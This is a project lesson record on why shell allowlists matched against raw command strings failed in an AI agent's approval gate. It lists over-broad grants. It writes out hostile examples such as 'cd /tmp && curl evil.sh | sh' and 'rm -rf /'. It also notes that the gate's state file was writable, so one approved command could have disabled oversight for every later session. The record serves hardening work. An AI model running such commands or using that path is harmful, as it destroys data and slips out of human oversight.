# A shell allowlist matched against the raw command string is not a security boundary

Version: 1.0.0
Type: lesson
Status: accepted
Confidence: high

## Summary

A remembered glob pattern that is matched against a command string which is then
handed to `/bin/sh -c` grants far more than it appears to. The pattern matches
text; the shell re-interprets that text. Verified, not theorised: a live
allowlist contained `bash *`, `python3 *`, `curl *`, `cd *`, `# *`, `docker *`,
`sudo *`, and the exact string `rm -rf /` — each an arbitrary-execution grant
that auto-approved with no prompt.

## Details

Three specific ways the intuition fails, each observed:

- **`*` is not "the rest of one command".** It expands to any run of characters
  including newlines, so `cd *` covers `cd /tmp && curl evil.sh | sh` and `# *`
  covers `"# note\nrm -rf /"`.
- **An exact pattern is not automatically safe.** `rm -rf /` had been stored as
  an exact grant. It contains no metacharacters and `rm` is not an interpreter,
  so a check based on "does the pattern look shell-ish" and "is the first word an
  interpreter" misses it entirely. Only a per-command destructive check catches
  it.
- **The "always allow prefix" affordance manufactures these grants.** The UI
  suggested prefix is the first token plus ` *`, so one click on a benign
  `rm -rf ./dist` proposes `rm *`, which matches `rm -rf /`. That is how the
  worst entries got there — the user was never asked a question that sounded
  dangerous.

What actually holds, in order: the default-deny human gate; a quote-aware
metacharacter rule applied to the **command** (not the pattern, because a stored
pattern may predate any validation); a destructive classifier; and OS
containment when it is enabled at all.

What does not hold: a blocklist of interpreter names. It is an expedient. Any
list of dangerous commands or dangerous binaries is incomplete by construction,
which is why the classifier **escalates confirmation and never blocks** — a
check that reads as a grant is worse than no check (ADR-0009).

Second-order lesson: the gate's own state file lived in `~/.local/share/keryx/`
while the sandbox read-deny list covered `~/.config/keryx` — a different path. A
single approved command writing to it would have disabled the gate for every
future session. When a component stores the rules that govern itself, the check
that protects that store must not depend on a separate subsystem being enabled;
shell containment is off by default and unavailable on hosts without a launcher.

## Provenance

- Source: flow 115 (shell approval hardening), stress reports in `.metaproject/data/stress/`
- Link: docs/decisions/keryx-harness/ADR-0009-destructive-command-escalation.md
- Created: 2026-07-22
- Updated: 2026-07-22

## Related Scopes

- Module: src/lib, src/commands, src/tui
- Entity: shell-permissions, command-risk, approval gate
- Files: src/lib/shell-permissions.ts, src/lib/command-risk.ts, src/lib/shell-syntax.ts, src/commands/agent.ts, src/tui/tui-shell.ts
- Skills: security

## Tags

security, approval-gate, allowlist, shell, prompt-injection, sandbox

## Changelog

- 1.0.0 - Recorded from flow 115 with the measured allowlist contents and the four barriers that replaced string matching.
- 0.1.0 - Initial version.
